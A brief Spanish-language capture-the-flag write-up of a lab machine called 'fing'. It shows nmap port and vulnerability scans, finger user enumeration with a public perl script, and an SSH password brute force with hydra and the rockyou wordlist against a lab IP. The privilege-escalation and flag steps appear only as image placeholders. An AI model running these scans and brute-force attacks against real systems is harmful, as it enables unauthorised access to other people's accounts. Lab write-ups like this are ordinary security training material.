# Máquina fing

### Reconocimiento de la Ip de la máquina víctima

![alt text](image.png)

### Puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 192.168.42.172

![alt text](image-1.png)

### Servicios y versiones 

sudo nmap -sV --script vuln -p22,79,80 --min-rate 6000 -vvv 192.168.42.172

![alt text](image-2.png)


### Explotación

Finger es un protocolo de Internet que permite obtener información sobre los usuarios conectados a un sistema remoto.

Entonces lo enumeramos con un script en perl.

https://github.com/pentestmonkey/finger-user-enum/blob/master/finger-user-enum.pl

![alt text](image-3.png)

![alt text](image-4.png)

hacemos fuerza bruta con hydra:

hydra -l adam -P /usr/share/wordlists/rockyou.txt ssh://192.168.42.172 -t 64 -I

![alt text](image-5.png)

me conecto por ssh:

![alt text](image-6.png)

### Escalar privilegios

![alt text](image-7.png)

![alt text](image-8.png)

### user.txt

![alt text](image-9.png)

### root.txt

![alt text](image-10.png)

